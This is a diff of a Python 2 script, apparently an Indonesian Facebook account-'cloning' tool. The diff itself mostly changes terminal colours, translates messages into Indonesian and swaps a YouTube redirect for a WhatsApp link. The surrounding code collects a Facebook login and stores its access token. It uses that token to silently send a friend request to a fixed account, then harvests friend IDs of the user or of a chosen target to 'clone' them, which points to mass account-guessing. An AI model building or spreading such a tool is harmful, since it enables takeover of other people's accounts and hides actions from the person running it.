@@ -95,7 +95,7 @@ print  """
 \033[1;90m•◈••◈••◈•\033[1;91m█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\033[1;90m•◈••◈••◈•
 \033[1;90m•◈••◈••◈•\033[1;91m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\033[1;90m•◈••◈••◈•
 \033[1;90m•◈••◈••◈••◈•\033[1;91m••◈••◈••◈••◈••◈••◈••◈••◈•\033[1;94m•◈••◈••◈••◈•
-\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKALI•LINUX\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKALI•LINUX\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 jalan('\033[1;92m▬10%')
 jalan("\033[1;92m▬▬20%")
 jalan('\033[1;92m▬▬▬30%')
@@ -106,16 +106,16 @@ jalan('\033[1;92m▬▬▬▬▬▬▬70%')
 jalan('\033[1;92m▬▬▬▬▬▬▬▬80%')
 jalan('\033[1;92m▬▬▬▬▬▬▬▬▬90%')
 jalan('\033[1;92m▬▬▬▬▬▬▬▬▬100%')
-print "\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKALI•LINUX\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKALI•LINUX\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
 CorrectUsername = "RMX"
 CorrectPassword = "WAI"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;91m📄 \x1b[1;91mUSERNAME \x1b[1;91m ➵ \x1b[1;92m")
+    username = raw_input("\033[1;91m📄 \x1b[1;94mUSERNAME \x1b[1;91m ➵ \x1b[1;92m")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;91m🔐 \x1b[1;91mPASSWORD \x1b[1;91m ➵ \x1b[1;92m")
+    	password = raw_input("\033[1;91m🔐 \x1b[1;94mPASSWORD \x1b[1;91m ➵ \x1b[1;92m")
         if (password == CorrectPassword):
             print "LOGIN BERHASIL "  #Dev:love_hacker
 	    time.sleep(2)
@@ -138,7 +138,7 @@ def login():
 		jalan(' \033[1;91mWarning: \033[1;33mJANGAN GUNAKAN AKUN PRIBADI UNTUK LOGIN' )
 		jalan(' \033[1;91mWarning: \033[1;33mGUNAKAN AKUN BARU UNTUK LOGIN' )
 		jalan(' \033[1;91mWarning: \033[1;33mGUNAKAN SC INI DENGAN BIJAK!!' )                 
-		print "\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mKALI•LINUX\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ 0▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mKALI•LINUX\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ 0▬•◈•"
 		print('	   \033[1;94m▬\x1b[1;94m✔✔✔✔✔✔✔LOGIN FACEBOOK✔✔✔✔✔✔✔\x1b[1;94m▬' )
 		print('	' )
 		id = raw_input('\033[1;91m[+] \x1b[1;94mID/EMAIL\x1b[1;95m: \x1b[1;93m')
@@ -169,20 +169,20 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;92mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				print '\n\x1b[1;92mLOGIN BERHASIL.•◈•..'
+				os.system('xdg-open https://wa.me/6281273996358')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;91mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;93mYour Account is on Checkpoint")
+			print("\n\x1b[1;93mAKUN ANDA KENA CHEKPOINT")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;94mPassword/Email is wrong")
+			print("\n\x1b[1;94mPassword/Email salah")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -205,7 +205,7 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91mYour Account is on Checkpoint"
+		print"\033[1;91mAKUN ADA KENA CHEKPOINT"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -217,7 +217,7 @@ def menu():
 	print "  \033[1;92m«----•◈••◈•----\033[1;93mLogged in User Info\033[1;92m----•◈••◈•-----»"
 	print "	   \033[1;91m Name\033[1;93m:\033[1;92m"+nama+"\033[1;93m               "
 	print "	   \033[1;91m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;93m              "
-	print "\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mKALI•LINUX\033[1;90m•◈•▬ ▬ ▬ ▬ ▬•◈•"
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mKALI•LINUX\033[1;97m•◈•▬ ▬ ▬ ▬ ▬•◈•"
 	print "\033[1;97m-•◈•-\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mExit            "
 	pilih()
@@ -226,7 +226,7 @@ def menu():
 def pilih():
 	unikers = raw_input("\n\033[1;91mPILIH SALAH SATU>>> \033[1;97m")
 	if unikers =="":
-		print "\x1b[1;91mFill in correctly"
+		print "\x1b[1;91mISI DENGAN BENAR!!"
 		pilih()
 	elif unikers =="1":
 		super()
@@ -264,7 +264,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKALI•LINUX\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKALI•LINUX\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 		jalan('\033[1;93mGetting IDs \033[1;93m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -274,7 +274,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;92m[•◈•] \033[1;92mEnter ID\033[1;93m: \033[1;95m")
-		print "\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKALI•LINUX\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKALI•LINUX\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -300,9 +300,9 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;92m«--•◈••◈•---\x1b[1;93m•◈•BERHENTI TEKAN CTRL+Z•◈•\033[1;92m---•◈••◈•-»"
-	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKALI•LINUX\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKALI•LINUX\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	jalan(' \033[1;93m🔎🔎🔎🔎🔎🔎🔎\033[1;94mSTAR CLONING..\033[1;93m🔍🔍🔍🔍🔍🔍🔍 ')
-	print "\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKALI•LINUX\033[1;90m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKALI•LINUX\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
 	
 			
 	def main(arg):
